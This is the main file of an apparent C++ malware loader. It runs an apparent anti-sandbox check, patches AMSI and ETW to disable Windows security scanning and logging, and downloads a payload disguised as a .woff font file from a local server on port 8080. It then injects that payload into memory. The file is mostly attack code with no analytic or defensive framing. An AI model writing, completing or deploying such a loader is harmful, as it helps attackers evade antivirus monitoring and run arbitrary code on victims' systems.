#include "Bypass.h"
#include "Inject.h"
#include "Download.h"
#include "util.h"

int main() {
	DefenderEmulator();


	Bypass bypass;
	Inject injector;
	Download downloader;
	std::string data = "";

	bypass.PatchAMSI();
	bypass.PatchETW();

	data = downloader.download("127.0.0.1","/test.woff", 8080);

	injector.injection(data);
}


